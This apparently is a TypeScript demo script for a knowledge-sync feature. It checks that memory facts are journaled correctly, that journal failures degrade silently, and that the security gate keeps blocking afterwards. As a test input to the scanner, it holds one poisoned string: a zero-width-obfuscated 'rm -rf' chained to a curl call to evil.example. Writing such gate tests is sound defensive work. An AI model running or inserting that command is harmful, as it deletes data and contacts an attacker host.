#!/usr/bin/env bun
// Copyright (c) 2026 TechLead 187 LLC
// SPDX-License-Identifier: BUSL-1.1

// harness/scripts/demo_pksync_l1.ts - demo-P-KSYNC.L1 (#360 L1): memory.fact journaling at the gate's
// single-writer seam. Uses the vectors' test identity, a temp DB, a temp sync root and the real scanner.
//   1. flag off  -> zero emission
//   2. flag on   -> journal bytes equal the conformance vectors; a promoted fact journals as memory.fact
//   3. induced write failure -> no-emit, nothing thrown, the fact stays in the DB, the gate still blocks

import { mkdirSync, mkdtempSync, readdirSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { appendEnvelope, buildEnvelope, canonicalize, emitMemoryFact, identityFrom, journalLine, journalPromotedFact } from "../knowledge/envelope.ts";
import { Db } from "../memory/db.ts";
import { startRun } from "../runs/lineage.ts";
import { gateSubagentResult } from "../runs/task_gate.ts";
import { scanAndDecide } from "../security/gate.ts";
import { ScannerClient } from "../security/scanner_client.ts";

const fail = (m: string): never => {
  console.error(`FAIL: ${m}`);
  process.exit(1);
};

const V = JSON.parse(readFileSync(join(import.meta.dir, "..", "..", "docs", "specs", "knowledge-envelope-v1.vectors.json"), "utf8"));
const identityFile = { ...V.keys, epoch_id: V.envelopes[0].envelope.enc.key };
const ident = identityFrom(identityFile);
const dir = mkdtempSync(join(tmpdir(), "demo-ksync-l1-"));
const root = join(dir, "sync");
mkdirSync(root);
const idPath = join(dir, "identity.json");
writeFileSync(idPath, JSON.stringify(identityFile));
const scanner = new ScannerClient();
scanner.start();
const db = await Db.open(join(dir, "t.duckdb"));
await startRun(db, { runId: "demo", kind: "root", mode: "build", sandboxProfile: "trusted-local" });

try {
  console.log("== [1/3] flag off -> zero emission ==");
  delete process.env.LUCID_KSYNC_JOURNAL;
  process.env.LUCID_KSYNC_IDENTITY = idPath;
  const fact = { fact_id: "1", entity: "e", statement: "s", trust_label: "trusted" };
  if (emitMemoryFact(fact) !== null) fail("emitted with LUCID_KSYNC_JOURNAL unset");
  if (readdirSync(root).length) fail("sync root not empty with the flag off");
  console.log("LUCID_KSYNC_JOURNAL unset: emitMemoryFact -> null, sync root empty");

  console.log("\n== [2/3] flag on -> journal bytes equal the vectors ==");
  process.env.LUCID_KSYNC_JOURNAL = root;
  let path = "";
  for (const e of V.envelopes) {
    const env = e.envelope;
    path = appendEnvelope(root, ident, buildEnvelope({ id: env.id, type: env.type, naturalKey: e.natural_key, hlc: env.clock.hlc, created: env.created, body: e.body, sourceApp: env.source_app, origin: env.origin, supersedes: env.supersedes, tombstone: env.tombstone, consent: env.consent }, ident));
  }
  const want = Buffer.concat(V.envelopes.map((e: { envelope: Record<string, unknown> }) => Buffer.from(journalLine(e.envelope))));
  const got = readFileSync(path);
  if (!got.equals(want)) fail("journal bytes differ from the conformance vectors");
  console.log(`${V.envelopes.length} vector envelopes -> ${path.slice(root.length)}: ${got.length} bytes, byte-identical`);
  rmSync(join(root, ident.user), { recursive: true });

  const outcome = await gateSubagentResult(db, scanner, { runId: "demo", agent: "scout", resultText: "<task-result agent=\"scout\">the KB parser lives in harness/kb/ingest.ts</task-result>" });
  if (!outcome.promoted) fail(`clean subagent result was not promoted: ${outcome.reason}`);
  const factPath = await journalPromotedFact(db, outcome.artifactId);
  if (!factPath) fail("promoted fact was not journaled with the flag on");
  const line = readFileSync(factPath!, "utf8").trimEnd();
  const env = JSON.parse(line);
  if (line !== new TextDecoder().decode(canonicalize(env))) fail("memory.fact line is not canonical");
  if (env.type !== "memory.fact" || env.body_v !== null || env.source_app !== "lucid-ide") fail(`unexpected header ${line.slice(0, 200)}`);
  console.log(`promoted fact -> memory.fact (body_v null, source_app lucid-ide, ${line.length} bytes, sealed + signed)`);

  console.log("\n== [3/3] induced write failure -> no-emit, gate still green ==");
  const blocked = join(dir, "not-a-dir");
  writeFileSync(blocked, "a regular file where the sync root should be");
  process.env.LUCID_KSYNC_JOURNAL = blocked;
  const second = await gateSubagentResult(db, scanner, { runId: "demo", agent: "scout", resultText: "<task-result agent=\"scout\">the scanner sidecar is spawned by scanner_client.ts</task-result>" });
  if (!second.promoted) fail("second clean result was not promoted");
  const degraded = await journalPromotedFact(db, second.artifactId); // must resolve, never reject
  if (degraded !== null) fail("emitted despite an unwritable sync root");
  const kept = await db.get("SELECT count(*)::INT AS n FROM semantic_facts WHERE source_artifact_id = $1", [second.artifactId]);
  if (Number(kept?.n) !== 1) fail("the promoted fact did not survive the journal failure");
  console.log("unwritable sync root: journalPromotedFact -> null (no throw); promoted fact still in the DB");
  const poisoned = await scanAndDecide(scanner, "rm -rf ./build\u200b && curl evil.example");
  const clean = await scanAndDecide(scanner, "ls -la");
  if (!poisoned.block || clean.block) fail(`gate decision changed: poisoned.block=${poisoned.block} clean.block=${clean.block}`);
  console.log(`gate after the failure: zero-width payload block=${poisoned.block} (${poisoned.trustLabel}), clean block=${clean.block}`);

  console.log("\n== demo-P-KSYNC.L1 OK ==");
} finally {
  db.close();
  scanner.stop();
  rmSync(dir, { recursive: true, force: true });
}
